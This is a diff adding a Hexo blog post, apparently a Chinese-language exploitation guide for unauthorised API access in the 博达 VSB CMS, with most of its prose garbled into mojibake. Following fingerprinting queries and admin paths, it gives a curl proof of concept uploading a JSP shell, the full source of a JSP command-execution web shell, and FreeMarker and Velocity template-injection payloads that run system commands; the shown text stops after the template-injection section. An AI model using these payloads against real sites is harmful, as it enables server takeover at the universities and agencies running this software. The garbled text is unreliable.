@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 CMS鍚嶇О锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?寮€鍙戝晢锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級鎶€鏈爤锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL閮ㄧ讲鏋舵瀯锛氱珯缇ょ鐞嗘ā寮忥紙">
+<meta property="og:type" content="article">
+<meta property="og:title" content="博达CMS API未授权访问分析">
+<meta property="og:url" content="http://example.com/2026/07/09/%E5%8D%9A%E8%BE%BECMS%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
+<meta property="og:site_name" content="xiokuの小さな世界">
+<meta property="og:description" content="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 CMS鍚嶇О锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?寮€鍙戝晢锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級鎶€鏈爤锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL閮ㄧ讲鏋舵瀯锛氱珯缇ょ鐞嗘ā寮忥紙">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-09T08:07:15.000Z">
+<meta property="article:modified_time" content="2026-07-09T08:07:16.056Z">
+<meta property="article:author" content="Xioku">
+<meta property="article:tag" content="API">
+<meta property="article:tag" content="未授权">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="CMS">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/07/09/%E5%8D%9A%E8%BE%BECMS%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>博达CMS API未授权访问分析 | xiokuの小さな世界</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xiokuの小さな世界</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xioku的小破站</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/07/09/%E5%8D%9A%E8%BE%BECMS%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xioku">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiokuの小さな世界">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          博达CMS API未授权访问分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2026-07-09 16:07:15 / Modified: 16:07:16" itemprop="dateCreated datePublished" datetime="2026-07-09T16:07:15+08:00">2026-07-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="鍗氳揪CMS-API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"><a href="#鍗氳揪CMS-API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡" class="headerlink" title="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"></a>鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</h1><blockquote>
+<p><strong>CMS鍚嶇О</strong>锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?<br><strong>寮€鍙戝晢</strong>锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級<br><strong>鎶€鏈爤</strong>锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL<br><strong>閮ㄧ讲鏋舵瀯</strong>锛氱珯缇ょ鐞嗘ā寮忥紙1鍙扮鐞嗘湇鍔″櫒 + N鍙板彂甯冩湇鍔″櫒锛?<br><strong>瀹㈡埛缇や綋</strong>锛氶珮鏍★紙70%+锛夈€佹斂搴滄満鏋勩€佺鐮旈櫌鎵€<br><strong>鏂囨。鏃ユ湡</strong>锛?026-07-08</p>
+</blockquote>
+<hr>
+<h2 id="鐩綍"><a href="#鐩綍" class="headerlink" title="鐩綍"></a>鐩綍</h2><ol>
+<li>[浜у搧鑳屾櫙涓庣壒寰佽瘑鍒玗(#涓€浜у搧鑳屾櫙涓庣壒寰佽瘑鍒?</li>
+<li><a href="#%E6%B5%9C%E5%AE%8Epi%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%A9%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%8F%8F%E9%8F%85%EE%88%9A%E6%B5%98">API鏈巿鏉冩紡娲炲叏鏅浘</a></li>
+<li>[楂樺嵄婕忔礊锛圥0-P1锛塢(#涓夐珮鍗辨紡娲瀙0-p1)<ul>
+<li>3.1 浠绘剰鏂囦欢涓婁紶 鈫?Getshell</li>
+<li>3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</li>
+<li>3.3 鍙嶅簭鍒楀寲 鈫?RCE</li>
+<li>3.4 浠绘剰鍛戒护鎵ц</li>
+</ul>
+</li>
+<li>[涓珮鍗辨紡娲烇紙P1-P2锛塢(#鍥涗腑楂樺嵄婕忔礊p1-p2)<ul>
+<li>4.1 鏁忔劅淇℃伅娉勯湶</li>
+<li>4.2 姘村钩瓒婃潈锛圛DOR锛?   - 4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</li>
+<li>4.4 浠绘剰瀵嗙爜閲嶇疆</li>
+<li>4.5 SQL 娉ㄥ叆</li>
+<li>4.6 Druid 鐩戞帶鏈巿鏉?   - 4.7 Swagger API 鏂囨。娉勯湶</li>
+</ul>
+</li>
+<li>[涓嵄婕忔礊锛圥2-P3锛塢(#浜斾腑鍗辨紡娲瀙2-p3)<ul>
+<li>4.1 SSRF</li>
+<li>4.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</li>
+<li>4.3 瀛樺偍鍨?XSS</li>
+<li>4.4 寮卞彛浠?&#x2F; 榛樿鍙ｄ护</li>
+</ul>
+</li>
+<li>[宸茬煡瀹樻柟瀹夊叏澹版槑](#鍏凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</li>
+<li><a href="#%E6%B6%93%E5%86%A8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4?checklist">瀹炴垬妫€娴?Checklist</a></li>
+<li>[闃插尽寤鸿](#鍏槻寰″缓璁?</li>
+</ol>
+<hr>
+<h2 id="涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆"><a href="#涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆" class="headerlink" title="涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆"></a>涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆</h2><h3 id="1-1-浜у搧姒傝堪"><a href="#1-1-浜у搧姒傝堪" class="headerlink" title="1.1 浜у搧姒傝堪"></a>1.1 浜у搧姒傝堪</h3><p>鍗氳揪鍏ㄥ獟浣撶綉绔欑兢绠＄悊骞冲彴锛圴SB锛夋槸鍥藉唴楂樻牎甯傚満鍗犳湁鐜囨渶楂樼殑绔欑兢绠＄悊绯荤粺銆傜郴缁熼噰鐢?*Java鎶€鏈爤**锛堟湭浣跨敤Struts2妗嗘灦锛夛紝鍚庣甯歌浜?Tomcat 瀹瑰櫒锛屾暟鎹簱澶氶噰鐢?PostgreSQL锛堥粯璁わ級鎴?Oracle&#x2F;MySQL銆?<br><strong>鍏稿瀷閮ㄧ讲璺緞</strong>锛?- Linux锛歚&#x2F;opt&#x2F;vsb9&#x2F;<code> 鎴?</code>&#x2F;opt&#x2F;vsb&#x2F;&#96;</p>
+<ul>
+<li>Windows锛歚C:\Program Files\VSB`</li>
+</ul>
+<h3 id="1-2-鎸囩汗鐗瑰緛"><a href="#1-2-鎸囩汗鐗瑰緛" class="headerlink" title="1.2 鎸囩汗鐗瑰緛"></a>1.2 鎸囩汗鐗瑰緛</h3><h4 id="HTTP-鍝嶅簲澶寸壒寰"><a href="#HTTP-鍝嶅簲澶寸壒寰" class="headerlink" title="HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;"></a>HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;</h4><p>X-Powered-By: VSB<br>Server: Apache-Coyote&#x2F;1.1<br>Set-Cookie: JSESSIONID&#x3D;…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 椤甸潰 / HTML 鐗瑰緛</span><br></pre></td></tr></table></figure>
+<p>Powered by 鍗氳揪缃戠珯缇?&#x2F;content&#x2F;common&#x2F;header.js<br>&#x2F;vsb&#x2F;<br>vsbclub<br>&#x2F;com.zving.* 锛堝弽缂栬瘧甯歌鍖呭悕锛?&#96;&#96;&#96;</p>
+<h4 id="榛樿绔彛"><a href="#榛樿绔彛" class="headerlink" title="榛樿绔彛"></a>榛樿绔彛</h4><table>
+<thead>
+<tr>
+<th align="left">绔彛</th>
+<th align="left">鐢ㄩ€?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">80&#x2F;443</td>
+<td align="left">鍓嶅彴闂ㄦ埛绔欑偣</td>
+</tr>
+<tr>
+<td align="left">8080</td>
+<td align="left">Tomcat 绠＄悊锛堥儴鍒嗛儴缃诧級</td>
+</tr>
+<tr>
+<td align="left">8443</td>
+<td align="left">HTTPS 绠＄悊鍚庡彴</td>
+</tr>
+</tbody></table>
+<h4 id="甯歌鍚庡彴璺緞"><a href="#甯歌鍚庡彴璺緞" class="headerlink" title="甯歌鍚庡彴璺緞"></a>甯歌鍚庡彴璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/vsb/admin/           鈫?绠＄悊鍚庡彴鐧诲綍</span><br><span class="line">/siteadmin/           鈫?绔欑偣绠＄悊</span><br><span class="line">/vsb/manager/         鈫?绯荤粺绠＄悊</span><br><span class="line">/vsb/console/         鈫?鎺у埗鍙?```</span><br><span class="line"></span><br><span class="line">#### FOFA / 鎼滅储寮曟搸鎸囩汗</span><br></pre></td></tr></table></figure>
+<p>app&#x3D;”鍗氳揪鍏ㄥ獟浣撶綉绔欑兢绠＄悊骞冲彴”<br>body&#x3D;”vsbclub”<br>body&#x3D;”鍗氳揪缃戠珯缇?<br>icon_hash&#x3D;”-886587282”   鈫?甯歌鍒ゆ柇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 1.3 API 璺緞瑙勫緥</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺鐨?API 閫氬父閬靛惊浠ヤ笅璺緞妯″紡锛堥€氳繃 JS 鍙嶇紪璇戞垨娴侀噺鎶撳彇鑾峰緱锛夛細</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>&#x2F;api&#x2F;xxx                  鈫?RESTful API<br>&#x2F;vsb&#x2F;api&#x2F;xxx              鈫?VSB 鍐呴儴 API<br>&#x2F;cms&#x2F;api&#x2F;xxx              鈫?CMS 鍐呭 API<br>&#x2F;pub&#x2F;api&#x2F;xxx              鈫?鍏紑 API<br>&#x2F;services&#x2F;xxx             鈫?WebService 鎺ュ彛</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 浜屻€丄PI鏈巿鏉冩紡娲炲叏鏅浘</span><br><span class="line"></span><br><span class="line">鍗氳揪 CMS 浣滀负**鍟嗕笟闂簮绯荤粺**锛屽叾 API 閴存潈瀹屽叏渚濊禆寮€鍙戣€呯殑鑷疄鐜般€傜敱浜庣珯缇ゆ灦鏋勬秹鍙婂ぇ閲忓唴閮?API 鎺ュ彛锛岀粡甯稿瓨鍦ㄩ壌鏉冮仐婕忛棶棰樸€?</span><br><span class="line">| 婕忔礊绫诲瀷 | 椋庨櫓绛夌骇 | 鏀诲嚮澶嶆潅搴?| 鍗卞 | 鍏稿瀷 API 璺緞 |</span><br><span class="line">|:---------|:--------:|:----------:|:----|:-------------|</span><br><span class="line">| 浠绘剰鏂囦欢涓婁紶 鈫?Getshell | 猸愨瓙猸愨瓙猸?| 浣?| 鏈嶅姟鍣ㄦ拨闄?| `/api/upload` `/vsb/uploadFile` |</span><br><span class="line">| 妯℃澘娉ㄥ叆 鈫?RCE | 猸愨瓙猸愨瓙猸?| 涓?| 鏈嶅姟鍣ㄦ拨闄?| `/api/template/save` `/vsb/template` |</span><br><span class="line">| 鍙嶅簭鍒楀寲 RCE | 猸愨瓙猸愨瓙猸?| 涓珮 | 鏈嶅姟鍣ㄦ拨闄?| Java RMI/Hessian 绔偣 |</span><br><span class="line">| 鏁忔劅淇℃伅娉勯湶 | 猸愨瓙猸愨瓙 | 鏋佷綆 | 鏁版嵁搴?Bucket 鍑嵁娉勯湶 | `/api/config` `/api/db` |</span><br><span class="line">| 姘村钩瓒婃潈 (IDOR) | 猸愨瓙猸愨瓙 | 浣?| 璺ㄧ珯绡℃敼/鏁版嵁绐冨彇 | `/api/article/edit?id=` |</span><br><span class="line">| 鍨傜洿瓒婃潈 | 猸愨瓙猸愨瓙 | 浣?| 鏉冮檺鎻愬崌鑷崇鐞嗗憳 | `/api/user/add?role=admin` |</span><br><span class="line">| 浠绘剰瀵嗙爜閲嶇疆 | 猸愨瓙猸愨瓙 | 浣?| 鎺ョ绠＄悊鍛樿处鍙?| `/api/user/resetPwd` |</span><br><span class="line">| SQL 娉ㄥ叆 | 猸愨瓙猸愨瓙 | 涓?| 鎷栧簱/鍚庡彴鐧诲綍缁曡繃 | `/api/site/list?siteId=` |</span><br><span class="line">| SSRF | 猸愨瓙猸?| 浣?| 鍐呯綉鎺㈡祴 | `/api/import?url=` |</span><br><span class="line">| 鐩綍閬嶅巻 | 猸愨瓙猸?| 浣?| 婧愮爜娉勯湶 | `/api/download?file=` |</span><br><span class="line">| Druid 鐩戞帶娉勯湶 | 猸愨瓙猸?| 鏋佷綆 | SQL 鐩戞帶 + Session | `/druid/index.html` |</span><br><span class="line">| Swagger 鏂囨。娉勯湶 | 猸愨瓙猸?| 鏋佷綆 | 鍏ㄩ噺 API 娉勯湶 | `/swagger-ui.html` |</span><br><span class="line">| XSS (瀛樺偍鍨? | 猸愨瓙猸?| 浣?| 閽撻奔/绠＄悊鍛樺姭鎸?| `/api/comment/add` |</span><br><span class="line">| 寮卞彛浠?/ 榛樿瀵嗙爜 | 猸愨瓙猸?| 鏋佷綆 | 鐩存帴鐧诲綍鍚庡彴 | `/vsb/admin/` |</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 涓夈€侀珮鍗辨紡娲烇紙P0-P1锛?</span><br><span class="line">### 3.1 浠绘剰鏂囦欢涓婁紶 鈫?Getshell</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氣瓙 鏈€楂樺嵄 鈥?鍙洿鎺ヨ幏鍙栨湇鍔″櫒鏉冮檺</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺鐨?*妯℃澘绠＄悊銆侀檮浠朵笂浼犮€佺珯鐐瑰浠芥仮澶?*绛夊姛鑳芥ā鍧楋紝濡傛灉 API 鏈壌鏉冿紝鏀诲嚮鑰呭彲浠ョ洿鎺ヤ笂浼?JSP/WAR 鏂囦欢鑷冲彲瑙ｆ瀽鐩綍銆?</span><br><span class="line">#### 妫€娴嬪叆鍙?</span><br></pre></td></tr></table></figure>
+<h1 id="甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴-JS-鍙嶇紪璇戠‘璁わ級"><a href="#甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴-JS-鍙嶇紪璇戠‘璁わ級" class="headerlink" title="甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級"></a>甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級</h1><p>POST &#x2F;api&#x2F;upload<br>POST &#x2F;api&#x2F;file&#x2F;upload<br>POST &#x2F;vsb&#x2F;uploadFile<br>POST &#x2F;cms&#x2F;api&#x2F;upload<br>POST &#x2F;siteadmin&#x2F;upload<br>POST &#x2F;vsb&#x2F;template&#x2F;upload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 娴嬭瘯 PoC</span><br><span class="line"></span><br><span class="line">**curl 娴嬭瘯锛圵indows PowerShell 鍏煎锛夛細**</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 1. 灏濊瘯涓婁紶 JSP 鏈ㄩ┈</span><br><span class="line">curl -X POST &quot;http://target.com/api/upload&quot; `</span><br><span class="line">  -F &quot;file=@shell.jsp&quot; `</span><br><span class="line">  -F &quot;dir=upload&quot;</span><br><span class="line"></span><br><span class="line"># 2. 杩斿洖璺緞濡?/upload/202607/shell.jsp</span><br><span class="line"># 3. 璁块棶纭</span><br><span class="line">curl &quot;http://target.com/upload/202607/shell.jsp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>JSP 椹唴瀹圭ず渚嬶細</strong></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line; </span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">      out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>娉ㄦ剰锛氬疄闄呰矾寰勯渶娴嬭瘯 <code>/upload/</code>銆乣&#x2F;vsb&#x2F;upload&#x2F;<code>銆乣/files/</code> 绛夊父瑙佸彲鍐欏彲鎵ц鐩綍銆?</p>
+</blockquote>
+<hr>
+<h3 id="3-2-妯℃澘娉ㄥ叆-SSTI-鈫-RCE"><a href="#3-2-妯℃澘娉ㄥ叆-SSTI-鈫-RCE" class="headerlink" title="3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE"></a>3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮 鈥?鍗氳揪 VSB 鏈夊彲瑙嗗寲妯℃澘璁捐妯″潡</p>
+<p>鍗氳揪绔欑兢鐨勬牳蹇冨姛鑳戒箣涓€鏄?*妯℃澘绠＄悊**锛屾敮鎸佸彲瑙嗗寲缂栬緫 HTML 妯℃澘銆傚鏋滄ā鏉夸繚瀛?缂栬緫 API 鏈壌鏉冿紝鍙€氳繃妯℃澘寮曟搸娉ㄥ叆鎵ц浠绘剰浠ｇ爜銆?</p>
+<h4 id="妫€娴嬪叆鍙"><a href="#妫€娴嬪叆鍙" class="headerlink" title="妫€娴嬪叆鍙?"></a>妫€娴嬪叆鍙?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/template/save</span><br><span class="line">POST /api/template/edit</span><br><span class="line">POST /vsb/template/save</span><br><span class="line">POST /cms/template/create</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤鎬濊矾"><a href="#鍒╃敤鎬濊矾" class="headerlink" title="鍒╃敤鎬濊矾"></a>鍒╃敤鎬濊矾</h4><p>鍗氳揪鍩轰簬 Java 鎶€鏈爤锛屽叾妯℃澘寮曟搸鍙兘鍩轰簬 FreeMarker銆乂elocity 鎴栬嚜瀹氫箟寮曟搸銆係STI 娴嬭瘯鏂瑰紡锛?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># FreeMarker 娴嬭瘯 payload</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&lt;#assign x=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;x(&quot;whoami&quot;)&#125;</span><br><span class="line"></span><br><span class="line"># Velocity 娴嬭瘯 payload</span><br><span class="line">#set($x=7*7)$x</span><br><span class="line">#set($e=&quot;Runtime&quot;)$e.getRuntime().exec(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
+
+<hr>
